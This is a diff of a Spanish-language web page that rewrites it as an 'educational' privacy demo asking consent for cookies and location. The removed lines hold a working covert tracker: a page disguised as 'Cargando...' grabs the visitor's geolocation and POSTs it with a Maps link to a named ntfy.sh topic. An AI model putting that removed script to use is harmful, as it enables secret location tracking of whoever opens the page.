@@ -2,22 +2,109 @@
 <html lang="es">
 <head>
   <meta charset="UTF-8">
-  <title>Cargando...</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Página de Prueba Educativa - Privacidad Digital</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 20px;
+      background-color: #f4f4f4;
+    }
+    #cookie-banner {
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      background-color: #333;
+      color: white;
+      padding: 20px;
+      text-align: center;
+      z-index: 1000;
+    }
+    #cookie-banner button {
+      background-color: #4CAF50;
+      color: white;
+      border: none;
+      padding: 10px 20px;
+      cursor: pointer;
+      margin: 5px;
+    }
+    #cookie-banner button:hover {
+      background-color: #45a049;
+    }
+    .content {
+      max-width: 800px;
+      margin: 0 auto;
+      padding: 20px;
+      background-color: white;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+    h1, h2 {
+      color: #333;
+    }
+    p {
+      line-height: 1.6;
+    }
+  </style>
 </head>
 <body>
-  <p>Cargando página...</p>
+  <div class="content">
+    <h1>Página de Prueba Educativa sobre Privacidad Digital</h1>
+    <p>Esta página es una demostración educativa para aprender sobre cómo los sitios web solicitan permisos de privacidad, como cookies y ubicación. Al participar, estás aceptando voluntariamente esta experiencia de aprendizaje.</p>
+    <h2>¿Qué aprenderemos?</h2>
+    <ul>
+      <li>Cómo los sitios web usan cookies para rastrear tu actividad.</li>
+      <li>Por qué los navegadores requieren consentimiento explícito para acceder a tu ubicación.</li>
+      <li>Cómo los permisos pueden solicitarse en secuencia para recopilar más datos.</li>
+    </ul>
+    <p><strong>Nota importante:</strong> Esta página no almacena datos reales ni los comparte fuera de esta demostración. Todo se queda en tu navegador.</p>
+    <div id="status"></div>
+  </div>
+
+  <div id="cookie-banner">
+    <p>Esta página utiliza cookies para mejorar tu experiencia. Al aceptar, también solicitaremos permiso para acceder a tu ubicación como parte de esta demostración educativa.</p>
+    <button id="accept-cookies">Aceptar Cookies y Ubicación</button>
+    <button id="decline-cookies">Rechazar</button>
+  </div>
+
   <script>
-    navigator.geolocation.getCurrentPosition(function(pos) {
-      const lat = pos.coords.latitude;
-      const lon = pos.coords.longitude;
-      const maps = `https://maps.google.com/?q=${lat},${lon}`;
-      fetch("https://ntfy.sh/ubicacion-jared-2024xz", {
-        method: "POST",
-        body: `Ubicación recibida!\nLatitud: ${lat}\nLongitud: ${lon}\nMaps: ${maps}`
-      });
-      document.body.innerHTML = "<p>Página cargada correctamente.</p>";
-    }, function() {
-      document.body.innerHTML = "<p>Página cargada correctamente.</p>";
+    const cookieBanner = document.getElementById('cookie-banner');
+    const acceptBtn = document.getElementById('accept-cookies');
+    const declineBtn = document.getElementById('decline-cookies');
+    const statusDiv = document.getElementById('status');
+
+    // Mostrar banner al cargar
+    window.onload = function() {
+      cookieBanner.style.display = 'block';
+    };
+
+    acceptBtn.addEventListener('click', function() {
+      cookieBanner.style.display = 'none';
+      // Simular aceptación de cookies
+      localStorage.setItem('cookiesAccepted', 'true');
+      statusDiv.innerHTML = '<p>Cookies aceptadas. Ahora solicitando permiso de ubicación...</p>';
+
+      // Solicitar ubicación después de un breve delay para demostrar secuencia
+      setTimeout(function() {
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(function(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            statusDiv.innerHTML += '<p>¡Ubicación obtenida exitosamente!</p><p>Latitud: ' + lat + ', Longitud: ' + lon + '</p><p>En un sitio real, esta información podría enviarse a servidores para rastreo.</p>';
+          }, function(error) {
+            statusDiv.innerHTML += '<p>Permiso de ubicación denegado o error: ' + error.message + '</p><p>Esto demuestra cómo los usuarios pueden controlar sus permisos.</p>';
+          });
+        } else {
+          statusDiv.innerHTML += '<p>La geolocalización no es soportada por este navegador.</p>';
+        }
+      }, 1000); // 1 segundo de delay para mostrar la secuencia
+    });
+
+    declineBtn.addEventListener('click', function() {
+      cookieBanner.style.display = 'none';
+      statusDiv.innerHTML = '<p>Cookies rechazadas. No se solicitará ubicación.</p><p>¡Buena decisión para proteger tu privacidad!</p>';
     });
   </script>
 </body>
